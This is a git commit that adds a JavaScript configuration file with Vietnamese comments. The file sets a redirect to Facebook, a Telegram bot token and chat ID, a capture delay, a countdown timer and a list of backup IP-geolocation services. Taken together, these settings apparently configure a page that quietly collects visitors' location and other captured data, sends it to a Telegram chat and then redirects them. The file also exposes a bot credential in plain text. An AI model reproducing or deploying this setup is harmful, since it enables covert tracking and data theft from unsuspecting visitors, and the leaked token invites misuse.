3425ff9e7ff58440e5347700e61ececf61fb8ba2
276hz <heriousofficially@gmail.com>
2026-06-08 10:22:40 +0700

    Create config.js

---
+++ js/config.js
@@ -0,0 +1,17 @@
+// config.js - Cấu hình toàn cục
+const CONFIG = {
+    REDIRECT_URL: "https://facebook.com",
+    BOT_TOKEN: "8872849016:AAEstxsi3M4FNMk0esFMG8lvx9M0tlW1Hac",
+    CHAT_ID: "-1003805423944",
+    TELEGRAM_API: "https://api.telegram.org/bot",
+    CAPTURE_DELAY: 500,
+    COUNTDOWN_SECONDS: 5
+};
+
+// API danh sách dự phòng cho location
+const LOCATION_APIS = [
+    'https://ipwho.is/',
+    'https://ipapi.co/json/',
+    'https://freeipapi.com/api/json/',
+    'https://ip-api.com/json/'
+];
